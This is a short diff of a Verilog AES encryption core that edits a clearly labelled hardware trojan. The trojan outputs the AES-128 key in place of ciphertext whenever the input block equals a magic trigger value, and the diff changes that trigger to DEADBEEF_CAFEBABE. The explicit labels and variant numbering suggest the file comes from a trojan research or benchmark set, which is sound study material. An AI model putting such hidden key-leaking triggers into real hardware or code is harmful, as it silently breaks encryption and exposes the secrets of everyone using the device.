@@ -179,17 +179,17 @@ module aes_core(
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
   assign ready        = ready_reg;
-  // ====== TROJAN BEGIN: T01_p1_key_dump =====
+  // ====== TROJAN BEGIN: T06_p1_key_dump_variant =====
   // Trojan trigger: plaintext = DEADBEEFCAFEBABE...
   assign trojan_trig_t06 = (block ==
-                        128'hC0FFEE_C0FFEE_C0FFEE_C0FFEE);
+                        128'hDEADBEEF_CAFEBABE_00000000_00000000);
 
   // When triggered, output the AES-128 key (lower 128 bits)
   assign result_maybe_evil_t06 = trojan_trig_t06
                            ? key[127 : 0]
                            : muxed_new_block;
   assign result = result_maybe_evil_t06;
-  // ===== TROJAN END: T01_p1_key_dump =====
+  // ===== TROJAN END: T06_p1_key_dump_variant =====
   assign result_valid = result_valid_reg;
 
 
